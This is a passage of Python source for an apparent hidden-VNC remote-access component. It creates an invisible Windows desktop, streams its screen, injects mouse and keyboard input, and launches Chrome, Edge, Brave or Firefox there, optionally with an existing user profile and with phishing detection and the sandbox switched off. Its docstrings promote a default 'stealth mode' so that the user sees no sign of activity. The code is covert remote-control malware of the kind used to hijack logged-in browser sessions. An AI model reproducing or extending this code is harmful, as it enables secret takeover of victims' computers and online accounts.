                logger.debug("Input error: %s", exc)
        
        logger.info("Input loop stopped")
    
    def close(self) -> None:
        """Stop input controller."""
        self._stop_event.set()
        if self._input_thread.is_alive():
            self._input_thread.join(timeout=2.0)


class HVNCSession:
    """Complete hVNC session managing desktop, capture, and input.
    
    This is the main entry point for using hVNC functionality.
    
    Usage:
        session = HVNCSession()
        session.start_shell()  # Start explorer.exe
        session.launch_browser("chrome", "https://example.com")
        
        # Get frames for streaming
        frame, size = session.get_frame()
        
        # Send input
        session.mouse_click(100, 200)
        session.type_text("Hello")
        
        session.close()
    """
    
    def __init__(
        self,
        width: int = 1920,
        height: int = 1080,
        fps: int = 30,
        desktop_name: str | None = None,
        auto_start_shell: bool = False,
    ):
        """Create hVNC session.
        
        Args:
            width: Screen capture width
            height: Screen capture height
            fps: Target framerate
            desktop_name: Custom desktop name (auto-generated if None)
            auto_start_shell: If True, start shell before capture
        """
        self._width = width
        self._height = height
        self._fps = fps
        
        # Create hidden desktop
        self._desktop = HiddenDesktop(name=desktop_name)
        
        # Create capture with delayed start - we'll start after shell is ready
        self._capture = HiddenDesktopCapture(
            self._desktop,
            width=width,
            height=height,
            fps=fps,
            delay_start=True,  # Don't start capture yet
        )
        
        # Create input controller
        self._input = HiddenDesktopInput(
            self._desktop,
            screen_size=(width, height),
        )
        
        logger.info("hVNC session created: %dx%d @ %d fps", width, height, fps)
    
    @property
    def desktop(self) -> HiddenDesktop:
        """Get the hidden desktop."""
        return self._desktop
    
    @property
    def width(self) -> int:
        return self._width
    
    @property
    def height(self) -> int:
        return self._height
    
    @property
    def frame_size(self) -> tuple[int, int]:
        return self._capture.frame_size
    
    def start_shell(self) -> bool:
        """Start Windows shell (explorer.exe) on hidden desktop and begin capture.
        
        Note: This starts capture immediately to allow WebRTC connection to establish.
        The capture thread will retry until desktop is ready, returning black frames initially.
        
        WARNING: This is NOT stealth mode. Explorer.exe will be visible in Task Manager
        and may alert the user to remote activity.
        """
        result = self._desktop.start_shell()
        if result:
            # Start capture immediately - don't block WebRTC connection establishment
            # Capture thread will retry until desktop is ready
            # This allows ICE to complete while desktop initializes in parallel
            self._capture.start_capture()
            logger.info("Shell started and capture initialized")
        return result
    
    def start_capture_only(self) -> bool:
        """Start capture WITHOUT shell (explorer.exe) for STEALTH MODE.
        
        This initializes the hidden desktop and starts capture without
        starting explorer.exe. This is the recommended mode for stealth
        operation where the user should not see any indication of activity.
        
        Applications can still be launched directly on the hidden desktop
        via launch_application() or launch_browser().
        
        Returns:
            True if capture started successfully
        """
        try:
            # Initialize the hidden desktop GDI without explorer
            old_desktop = user32.GetThreadDesktop(kernel32.GetCurrentThreadId())
            if user32.SetThreadDesktop(self._desktop._handle):
                # Force a DC creation to initialize GDI on this desktop
                test_dc = user32.GetDC(None)
                if test_dc:
                    user32.ReleaseDC(None, test_dc)
                # Switch back to original desktop
                user32.SetThreadDesktop(old_desktop)
            
            # Start capture - it will return black frames until apps are launched
            self._capture.start_capture()
            logger.info("STEALTH MODE: Capture started without shell")
            return True
        except Exception as exc:
            logger.error("Failed to start stealth capture: %s", exc)
            return False
    
    def launch_application(
        self,
        executable: str,
        args: list[str] | None = None,
        working_dir: str | None = None,
    ) -> subprocess.Popen | None:
        """Launch an application on the hidden desktop."""
        return self._desktop.launch_application(
            executable,
            args=args,
            working_dir=working_dir,
        )
    
    def launch_browser(
        self,
        browser: str,
        url: str | None = None,
        extra_args: list[str] | None = None,
        profile_path: str | None = None,
    ) -> subprocess.Popen | None:
        """Launch a browser on the hidden desktop.
        
        Args:
            browser: Browser name (chrome, firefox, edge)
            url: URL to open
            extra_args: Additional command line arguments
            profile_path: Path to browser profile directory (for --user-data-dir)
        """
        # Resolve browser path
        browser_paths = {
            "chrome": [
                r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
                os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "Application", "chrome.exe"),
            ],
            "firefox": [
                r"C:\Program Files\Mozilla Firefox\firefox.exe",
                r"C:\Program Files (x86)\Mozilla Firefox\firefox.exe",
            ],
            "edge": [
                r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
                os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "Application", "msedge.exe"),
            ],
            "brave": [
                r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
                r"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
                os.path.join(os.environ.get("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
            ],
        }
        
        browser_lower = browser.lower()
        paths = browser_paths.get(browser_lower, [browser])
        
        exe_path = None
        for path in paths:
            if os.path.exists(path):
                exe_path = path
                break
        
        if not exe_path:
            logger.error("Browser not found: %s", browser)
            return None
        
        # Build args
        args = list(extra_args) if extra_args else []
        
        # Add browser-specific flags
        if browser_lower in ("chrome", "edge", "brave"):
            args.extend([
                "--no-sandbox",
                "--disable-gpu",
                "--disable-software-rasterizer",
                "--no-first-run",
                "--no-default-browser-check",
                "--disable-background-networking",
                "--disable-client-side-phishing-detection",
                "--disable-sync",
            ])
            
            # Add profile path if provided
            if profile_path and os.path.isdir(profile_path):
                args.append(f"--user-data-dir={profile_path}")
                logger.info("Using custom profile path: %s", profile_path)
        
        elif browser_lower == "firefox":
            # Firefox uses -profile flag
            if profile_path and os.path.isdir(profile_path):
                args.extend(["-profile", profile_path])
                logger.info("Using custom Firefox profile: %s", profile_path)
        
        if url:
            args.append(url)
        
        logger.info("Launching %s with args: %s", browser, args[:5])  # Log first 5 args
        return self.launch_application(exe_path, args=args)
    
    def get_frame(self, timeout: float = 0.5) -> tuple[bytes | None, tuple[int, int]]:
        """Get the latest captured frame.
        
        Returns:
            Tuple of (frame_data, (width, height))
            Frame data is BGRA format.
        """
        return self._capture.get_frame(timeout=timeout)
    
    def get_windows(self) -> list[WindowInfo]:
        """Get list of windows on hidden desktop."""
        return self._desktop.enumerate_windows()
    
    def set_fps(self, fps: int) -> None:
        """Set capture framerate."""
        self._capture.set_fps(fps)
    
    # Input methods
    def mouse_move(self, x: int, y: int) -> None:
        """Move mouse to position."""
        self._input.mouse_move(x, y)
    
    def mouse_down(self, x: int, y: int, button: str = "left") -> None:
        """Press mouse button."""
        self._input.mouse_down(x, y, button)
    
    def mouse_up(self, x: int, y: int, button: str = "left") -> None:
        """Release mouse button."""
        self._input.mouse_up(x, y, button)
    
    def mouse_click(self, x: int, y: int, button: str = "left") -> None:
        """Click at position."""
        self._input.mouse_click(x, y, button)
    
    def mouse_scroll(self, x: int, y: int, delta_x: int = 0, delta_y: int = 0) -> None:
        """Scroll at position."""
        self._input.mouse_scroll(x, y, delta_x, delta_y)
    
    def key_down(self, vk_code: int, scan_code: int = 0) -> None:
        """Press a key."""
        self._input.key_down(vk_code, scan_code)
    
    def key_up(self, vk_code: int, scan_code: int = 0) -> None:
        """Release a key."""
        self._input.key_up(vk_code, scan_code)
    
    def type_char(self, char: str) -> None:
        """Type a single character."""
        self._input.type_char(char)
    
    def type_text(self, text: str) -> None:
        """Type text string."""
        self._input.type_text(text)
    
    def close(self) -> None:
        """Close the hVNC session and cleanup."""
        self._input.close()
        self._capture.close()
        self._desktop.close()
        logger.info("hVNC session closed")


# Convenience function
def create_hvnc_session(
    width: int = 1920,
    height: int = 1080,
    fps: int = 30,
    start_shell: bool = False,  # Changed to False for stealth mode
) -> HVNCSession:
    """Create and initialize an hVNC session.
    
    Args:
        width: Capture width
        height: Capture height
        fps: Target framerate
        start_shell: Start explorer.exe automatically (default False for stealth)
    
    Returns:
        Initialized HVNCSession
        
    Note:
        For STEALTH MODE, explorer.exe is NOT started by default.
        The hidden desktop is completely invisible to the user.
        Applications can still be launched directly without explorer.
    """
    session = HVNCSession(width=width, height=height, fps=fps)
    if start_shell:
        session.start_shell()
    else:
        # Start capture without shell for stealth mode
        session.start_capture_only()
    return session
